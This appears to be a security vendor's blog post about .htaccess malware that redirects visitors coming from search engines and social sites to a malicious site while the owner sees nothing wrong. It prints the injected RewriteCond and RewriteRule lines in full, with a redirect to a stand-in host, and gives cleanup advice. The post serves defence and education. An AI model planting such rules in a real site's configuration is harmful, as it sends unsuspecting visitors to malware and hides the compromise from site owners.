Conditional redirects (or the htaccess malware)

We see all types of malware daily, but one of them seems to cause a lot of confusion to our users (and everyone in general). This is the common question we hear:
“Some users are complaining that when they search for my site on Google, they are redirected to a site full of malware/virus/spam, but when I access, it looks fine. I even scanned it with multiple anti-virus and they didn’t detect anything”
What that means is that someone hacked your site and modified your .htaccess file to redirect users coming from Google to a malware-infested site. Because of that, you end up blacklisted and losing users that can’t reach your site. (well, at least 99% of the time this is the cause).
That’s how the modified .htaccess file looks like:
RewriteEngine OnRewriteCond %{HTTP_REFERER} .*gooo?gle.* [OR]RewriteCond %{HTTP_REFERER} .*ask.* [OR]RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]RewriteCond %{HTTP_REFERER} .*excite.* [OR]RewriteCond %{HTTP_REFERER} .*altavista.* [OR]RewriteCond %{HTTP_REFERER} .*msn.* [OR]RewriteCond %{HTTP_REFERER} .*netscape.* [OR]RewriteCond %{HTTP_REFERER} .*aol.* [OR]RewriteCond %{HTTP_REFERER} .*hotbot.* [OR]RewriteCond %{HTTP_REFERER} .*goto.* [OR]RewriteCond %{HTTP_REFERER} .*infoseek.* [OR]RewriteCond %{HTTP_REFERER} .*mamma.* [OR]RewriteCond %{HTTP_REFERER} .*alltheweb.* [OR]RewriteCond %{HTTP_REFERER} .*lycos.* [OR]RewriteCond %{HTTP_REFERER} .*search.* [OR]RewriteCond %{HTTP_REFERER} .*metacrawler.* [OR]RewriteCond %{HTTP_REFERER} .*bing.* [OR]RewriteCond %{HTTP_REFERER} .*dogpile.*RewriteRule .* https://badsite.com [R,L]
On some we even see these conditional redirects if the users are coming from Twitter, myspace, Linkedin, etc:
..RewriteCond %{HTTP_REFERER} .twitter. [OR]RewriteCond %{HTTP_REFERER} .blog. [OR]RewriteCond %{HTTP_REFERER} .live. [OR]RewriteCond %{HTTP_REFERER} .myspace. [OR]RewriteCond %{HTTP_REFERER} .linkedin. [OR]..
The reason most desktop anti virus (or malware scanners) won’t detect that when you scan your files is because they don’t understand the .htaccess file and they won’t follow this redirection. On Sucuri that’s how we would alert:How to fix it?
Fixing this redirection is very simple, you just need to delete these entries from your .htaccess file (you can have more than one, so check all your directories) and you are set. However, you still have to verify that you don’t have anything else hidden in there, so do a full scan of your web site to make sure you are clean.
In addition to that, you still need to fix the problem that allowed you to get hacked. Most of the time it means updating your web application (WordPress, Joomla, etc), changing your passwords and cleaning your desktop.
As always, if you need help to recover from a malware/hacking attack or need someone to monitor your web site for these issues, visit https://sucuri.net or just send us an email at contact@sucuri.net.
